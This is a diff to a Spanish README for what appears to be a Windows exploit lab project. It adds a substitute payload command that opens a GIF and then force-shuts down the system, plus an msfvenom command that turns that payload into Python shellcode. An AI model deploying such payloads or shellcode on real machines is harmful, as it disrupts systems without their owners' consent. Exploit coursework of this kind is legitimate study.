@@ -50,15 +50,18 @@ El repositorio se divide en tres carpetas principales:
    ```bash
    cmd.exe  https://www.reddit.com/media?url=https%3A%2F%2Fi.redd.it%2Fao2lcwh10f0f1.gif  && shutdown /f /s /t 5
     ```
-   Lo que se hace es abrir el gif en el navegador y luego apagar el sistema en lugar del payload de la solución, que es benigno y solamente abre una ventana Hello World!. 
+   Lo que se hace es abrir el gif en el navegador y luego apagar el sistema en lugar del payload de la solución, que es benigno y solamente abre una ventana Hello World!.
+
+   Para sacar el binario de dicho comando o de otros se pued usar:
+   ```bash
+   msfvenom -p windows/x64/exec CMD="cmd.exe /c start https://www.reddit.com/media?url=https%3A%2F%2Fi.redd.it%2Fao2lcwh10f0f1.gif && shutdown /f /s /t 5" -f python -b '\x00'~
+    ```   
 
 ## Cómo ejecutarlo
 
 ⚠️ **IMPORTANTE**
 
 Se debe ejecutar en dispositivos o MVs que tengan Windows como Sistema Operativo.
-
-
 
 Hay dos formas de ejecutar el código:
 
